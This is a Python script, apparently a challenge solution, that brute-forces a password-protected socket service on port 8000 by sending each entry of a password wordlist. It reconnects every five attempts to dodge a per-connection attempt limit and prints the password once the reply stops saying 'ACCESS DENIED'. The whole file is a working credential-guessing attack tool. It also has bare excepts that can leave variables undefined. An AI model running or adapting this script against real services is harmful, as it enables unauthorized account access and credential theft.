import socket
import sys

#port configuration
PORT = 8000
#host configuration
HOST = socket.gethostname()
#shows the logs to debug and the password that the program tries
SHOW_LOGS = False

def serverlink(first_time = False):
    s = socket.socket()
    try:
        s.connect((HOST, PORT))
        data = s.recv(1024)
    except:
        pass
    if first_time:
        print(f'connected to server...\n{data.decode()[0:47] if not SHOW_LOGS else data.decode()}')
    return s

def decryptionprotocol():
    print("Decryption commencing")
    f = open("password_list.txt")
    s = serverlink(True)
    counter = 0

    for x in f:
        if SHOW_LOGS:
            print(f'decryption attempting: {x}')
        counter += 1

        if (counter % 5 == 0):
            s.close()
            s = serverlink()

        try:
            s.sendall(x.encode("utf-8"))
            reply = s.recv(1024).strip().decode()
            
        except:
            pass
        if "ACCESS DENIED" not in reply:
            print(f'password is: {x} attempts to get password: {counter}\n"{reply}"')
            break
    else:
        print(f'password not found after {counter} attempts')

if __name__ == "__main__":
    if len(sys.argv) > 1:
        args = sys.argv[1:]
        SHOW_LOGS = "-l" in args
    decryptionprotocol()